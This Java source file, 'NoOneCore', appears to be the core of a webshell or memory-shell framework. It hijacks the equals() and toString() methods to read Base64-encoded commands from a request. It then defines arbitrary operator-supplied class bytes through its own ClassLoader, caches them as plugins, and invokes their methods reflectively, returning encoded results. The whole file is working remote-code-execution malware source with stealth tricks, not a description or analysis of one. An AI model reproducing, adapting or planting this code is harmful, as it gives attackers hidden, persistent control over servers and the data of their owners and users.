import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * @author ReaJason
 * @since 2025/8/29
 */
public class NoOneCore extends ClassLoader {

    private static final String ACTION = "action";
    private static final String CLASSNAME = "className";
    private static final String PLUGIN = "plugin";
    private static final String CLASS_BYTES = "classBytes";
    private static final String ARGS = "args";
    private static final String METHOD_NAME = "methodName";

    private static final String REFRESH = "refresh";
    private static final String CLASS_DEFINE = "classDefine";
    private static final String CLASS_RUN = "classRun";
    private static final String PLUGIN_CACHES = "pluginCaches";

    private static final String ACTION_STATUS = "status";
    private static final String ACTION_RUN = "run";
    private static final String ACTION_CLEAN = "clean";

    private static final String CODE = "code";
    private static final String ERROR = "error";
    private static final String DATA = "data";
    private static final int SUCCESS = 0;
    private static final int FAILURE = 1;

    // plugin to clazz
    public static Map<String, Class<?>> loadedPluginCache = new ConcurrentHashMap<>();

    private static String key = "";
    private static String aesKey = key.split("\\|")[0];
    private static String xorKey = key.split("\\|")[0];
    private OutputStream outputStream;
    private Writer writer;
    private byte[] inputBytes;
    private static NoOneCore classDefiner = new NoOneCore(Thread.currentThread().getContextClassLoader());

    public NoOneCore() {
    }

    public NoOneCore(ClassLoader parent) {
        super(parent);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = (Object[]) obj;
        Object input = args[0];
        Object output = args[1];
        if (input instanceof InputStream) {
            inputBytes = toByteArray((InputStream) input);
        } else if (input instanceof byte[]) {
            inputBytes = (byte[]) input;
        } else if (input instanceof String) {
            inputBytes = ((String) input).getBytes();
        }
        if (output instanceof OutputStream) {
            outputStream = (OutputStream) output;
        } else if (output instanceof Writer) {
            writer = (Writer) output;
        }
        return (outputStream != null || writer != null) &&
                (inputBytes != null);
    }

    private Class<?> defineClass(String className, byte[] bytes) {
        return super.defineClass(className, bytes, 0, bytes.length);
    }

    @Override
    public String toString() {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put(CODE, SUCCESS);
        Map<String, Object> args = new HashMap<>();
        try {
            args = deserialize(Base64.getDecoder().decode(inputBytes));
        } catch (Throwable e) {
            result.put(CODE, FAILURE);
            result.put(ERROR, getStackTraceAsString(new RuntimeException("args parsed failed, " + e.getMessage(), e)));
        }
        String action = (String) args.get(ACTION);
        if (action != null) {
            try {
                switch (action) {
                    case ACTION_STATUS:
                        result.putAll(getStatus());
                        break;
                    case ACTION_RUN:
                        result.putAll(run(args));
                        break;
                    case ACTION_CLEAN:
                        loadedPluginCache.clear();
                        classDefiner = null;
                        break;
                    default:
                        result.put(CODE, FAILURE);
                        result.put(ERROR, "action [" + action + "] not supported");
                }
            } catch (Throwable e) {
                result.put(CODE, FAILURE);
                result.put(ERROR, getStackTraceAsString(e));
            }
        }
        try {
            writeResult(result);
        } catch (Throwable ignored) {
        }
        return "ok";
    }

    public Map<String, Object> getStatus() {
        Map<String, Object> result = new HashMap<>();
        // plugin to className
        Map<String, String> caches = new HashMap<>();
        for (Map.Entry<String, Class<?>> entry : loadedPluginCache.entrySet()) {
            Class<?> clazz = entry.getValue();
            String plugin = entry.getKey();
            caches.put(plugin, clazz.getName());
        }
        result.put(PLUGIN_CACHES, caches);
        return result;
    }


    @SuppressWarnings("unchecked")
    public Map<String, Object> run(Map<String, Object> args) {
        Map<String, Object> result = new HashMap<>();
        String plugin = (String) args.get(PLUGIN);
        String className = (String) args.get(CLASSNAME);
        byte[] classBytes = (byte[]) args.get(CLASS_BYTES);
        boolean refresh = Boolean.parseBoolean((String) args.get(REFRESH));

        Class<?> clazz = null;

        if (!refresh && plugin != null) {
            clazz = loadedPluginCache.get(plugin);
        }

        if (clazz == null) {
            if (plugin == null) {
                throw new RuntimeException("plugin is required");
            }
            if (className == null || classBytes == null) {
                throw new RuntimeException("className and classBytes are required for class loading");
            }
            try {
                clazz = classDefiner.defineClass(className, classBytes);
                loadedPluginCache.put(plugin, clazz);
                result.put(CLASS_DEFINE, true);
            } catch (Throwable e) {
                throw new RuntimeException("class define failed, " + e.getMessage(), e);
            }
        }

        try {
            String methodName = (String) args.get(METHOD_NAME);
            if (methodName != null) {
                Map<String, Object> methodArgs = (Map<String, Object>) args.get(ARGS);
                if (methodArgs == null) {
                    methodArgs = new HashMap<>();
                }
                methodArgs.put(PLUGIN_CACHES, loadedPluginCache);
                result.put(DATA, clazz.getMethod(methodName, Map.class).invoke(null, methodArgs));
                result.put(CLASS_RUN, true);
            }
        } catch (Throwable e) {
            throw new RuntimeException("class run failed, " + e.getMessage(), e);
        }
        return result;
    }

    public void writeResult(Map<String, Object> result) throws IOException {
        byte[] res = serialize(result);
        String baseResult = Base64.getEncoder().encodeToString(res);
        if (outputStream != null) {
            byte[] bytes = baseResult.getBytes(StandardCharsets.UTF_8);
            outputStream.write(bytes, 0, bytes.length);
            outputStream.flush();
            outputStream.close();
        } else if (writer != null) {
            writer.write(baseResult);
            writer.flush();
            writer.close();
        }
    }

    public static byte[] toByteArray(InputStream input) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int len;
        try {
            while ((len = input.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
        } catch (IOException ignored) {
        } finally {
            if (input != null) {
                try {
                    input.close();
                } catch (IOException ignored) {
                }
            }
        }
        return baos.toByteArray();
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    public static Object invokeMethod(Object obj, String methodName) {
        return invokeMethod(obj, methodName, null, null);
    }

    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }

    static final byte NULL = 0x00;
    static final byte STRING = 0x01;
    static final byte INTEGER = 0x02;
    static final byte LONG = 0x03;
    static final byte DOUBLE = 0x04;
    static final byte BOOLEAN = 0x05;
    static final byte BYTE_ARRAY = 0x06;
    static final byte LIST = 0x7;
    static final byte OBJECT_ARRAY = 0x8;
    static final byte MAP = 0x10;

    public byte[] serialize(Map<String, Object> map) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);
        writeMap(dos, map);
        return baos.toByteArray();
    }

    public Map<String, Object> deserialize(byte[] data) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        DataInputStream dis = new DataInputStream(bais);
        byte type = dis.readByte();
        if (type == MAP) {
            return readMap(dis);
        } else {
            throw new IOException("Root object is not a Map.");
        }
    }

    private void writeMap(DataOutputStream dos, Map<String, Object> map) throws IOException {
        dos.writeByte(MAP);
        if (map == null) {
            dos.writeInt(0);
            return;
        }
        dos.writeInt(map.size());
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            dos.writeUTF(entry.getKey());
            writeObject(dos, entry.getValue());
        }
    }

    private void writeObject(DataOutputStream dos, Object obj) throws IOException {
        if (obj == null) {
            dos.writeByte(NULL);
        } else if (obj instanceof String) {
            dos.writeByte(STRING);
            dos.writeUTF((String) obj);
        } else if (obj instanceof Integer) {
            dos.writeByte(INTEGER);
            dos.writeInt((Integer) obj);
        } else if (obj instanceof Long) {
            dos.writeByte(LONG);
            dos.writeLong((Long) obj);
        } else if (obj instanceof Double) {
            dos.writeByte(DOUBLE);
            dos.writeDouble((Double) obj);
        } else if (obj instanceof Boolean) {
            dos.writeByte(BOOLEAN);
            dos.writeBoolean((Boolean) obj);
        } else if (obj instanceof byte[]) {
            dos.writeByte(BYTE_ARRAY);
            byte[] bytes = (byte[]) obj;
            dos.writeInt(bytes.length);
            dos.write(bytes);
        } else if (obj instanceof List) {
            dos.writeByte(LIST);
            List<?> list = (List<?>) obj;
            dos.writeInt(list.size());
            for (Object item : list) {
                writeObject(dos, item);
            }
        } else if (obj instanceof Object[]) {
            dos.writeByte(OBJECT_ARRAY);
            Object[] array = (Object[]) obj;
            dos.writeInt(array.length);
            for (Object item : array) {
                writeObject(dos, item);
            }
        } else if (obj instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> subMap = (Map<String, Object>) obj;
            writeMap(dos, subMap);
        } else {
            throw new IllegalArgumentException("Unsupported type for serialization: " + obj.getClass().getName());
        }
    }

    private Map<String, Object> readMap(DataInputStream dis) throws IOException {
        int size = dis.readInt();
        Map<String, Object> map = new HashMap<>(size);
        for (int i = 0; i < size; i++) {
            String key = dis.readUTF();
            Object value = readObject(dis);
            map.put(key, value);
        }
        return map;
    }

    private Object readObject(DataInputStream dis) throws IOException {
        byte type = dis.readByte();
        switch (type) {
            case NULL:
                return null;
            case STRING:
                return dis.readUTF();
            case INTEGER:
                return dis.readInt();
            case LONG:
                return dis.readLong();
            case DOUBLE:
                return dis.readDouble();
            case BOOLEAN:
                return dis.readBoolean();
            case BYTE_ARRAY:
                int len = dis.readInt();
                byte[] bytes = new byte[len];
                dis.readFully(bytes);
                return bytes;
            case LIST:
                int listSize = dis.readInt();
                List<Object> list = new ArrayList<>(listSize);
                for (int i = 0; i < listSize; i++) {
                    list.add(readObject(dis));
                }
                return list;
            case OBJECT_ARRAY:
                int arrayLength = dis.readInt();
                Object[] array = new Object[arrayLength];
                for (int i = 0; i < arrayLength; i++) {
                    array[i] = readObject(dis);
                }
                return array;
            case MAP:
                return readMap(dis);
            default:
                throw new IOException("Unknown data type found in stream: " + type);
        }
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }
}
